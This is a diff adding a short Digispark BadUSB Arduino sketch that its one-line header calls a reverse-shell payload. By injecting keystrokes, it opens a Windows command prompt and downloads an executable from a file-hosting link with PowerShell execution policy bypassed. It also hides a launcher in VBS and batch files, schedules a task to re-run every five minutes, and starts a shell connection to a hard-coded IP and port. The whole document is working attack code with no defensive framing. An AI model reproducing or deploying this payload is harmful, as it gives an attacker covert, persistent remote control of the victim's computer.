@@ -1,0 +1,34 @@
+This payload is a reverse shell that runs in the background every 5 minutes from 8:20 AM to 3:11 PM. 
+
+  #include "DigiKeyboard.h"
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("cd / & mkdir System & cd System & echo (wget 'https://a-21.1fichier.com/c39185452' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("echo Set WshShell = CreateObject('WScript.Shell') > c.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("echo WshShell.Run chr(34) ^& C:/System/d.bat ^& Chr(34), 0 >> c.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("echo Set WshShell = Nothing >>> c.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("echo START /MIN a.exe IP PORT -e cmd.exe -d ^& exit > d.bat");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("Schtasks /create /tn TaskSystem /tr C:/System/c.vbs /sc minute /mo 5 /st 08:20 /et 15:11");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("START /MIN a.exe 192.168.254.73 9999 -e cmd.exe -d & exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+void loop() {
+}
